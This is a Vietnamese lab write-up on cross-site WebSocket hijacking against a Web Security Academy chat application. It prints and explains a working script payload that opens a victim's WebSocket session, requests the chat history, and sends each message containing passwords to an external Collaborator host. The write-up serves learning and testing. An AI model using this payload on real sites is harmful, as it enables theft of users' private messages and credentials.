## Chiếm quyền điều khiển WebSocket trên nhiều trang web 
* Với bài lab trước là nội dung đầu vào dã được lọc nhưng mà khi mà mình có thể chặn và thay đổi nội dung bị lọc đó 1 lần nữa.
* Còn bài này là "Cross-site WebSocket hijacking"
* Bản chất đây là lỗi Kiểm soát phiên/ xác thực (Session Management / CSRF).
* Cơ chế: Server tin tưởng kết nối dựa trên cookie của người dùng mà không kiểm tra nguồn gốc
* <img width="997" height="574" alt="image" src="https://github.com/user-attachments/assets/5c44f8c0-9899-4172-b919-8e8b5c1adcd8" />
* Ta có req này đang `Upgrade: websocket` và là gói tin bắt tay WebSocket(HandShake) với mã `HTTP/1.1 101 Switching Protocol`
* Sau đó ta copy url và chỉnh lại như bên dưới đây
* `wss://0ae4001a04670c80806436ef00d800d9.web-security-academy.net/chat`
<pre> <script>
    var ws = new WebSocket('wss://0a2700ba041582f680a2176200030045.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://kay3sndsjq3n9hkng9cdll6bm2stgl4a.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script> </pre>
* Gửi payload này và dùng chức năng `Collaborator` ta thấy được payload như này.
* <img width="651" height="310" alt="image" src="https://github.com/user-attachments/assets/6c3874ae-816b-4263-af52-95228b6e2f2e" />
* Phân tích payload này thì
* `var ws = new WebSocket('wss://0a2700ba041582f680a2176200030045.web-security-academy.net/chat');`
* **Hành động** Trình duyệt khởi tạo 1 kết nối WebSocket tới máy chủ của bài lab.
<pre> ws.onopen = function() {
    ws.send("READY");
}; </pre>
* **Hành động** Ngay khi kết nối thành công `onopen`. script gửi tin nhắn văn bản `"READY"` lên máy chủ.
* **Mục đích** Trong bài lab này, máy chủ được lập trình để trả về toàn bộ lịch sử chat cũ khi nhận được tin nhắn "READY". Nếu không có dòng này, server có thể sẽ im lặng và chúng ta không lấy được gì.
<pre> ws.onmessage = function(event) {
    fetch('https://kay3sndsjq3n9hkng9cdll6bm2stgl4a.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
}; </pre>
* `ws.onmessage`: Đây là "Đôi tai" nghe ngóng. Bất cứ khi nào máy chủ trả về dữ liệu (chính là lịch sử chat chứa mật khẩu), hàm sẽ chạy.
* `fetch(...)`: Dùng để chuyển dữ liệu vừa trộm được ra ngoài.
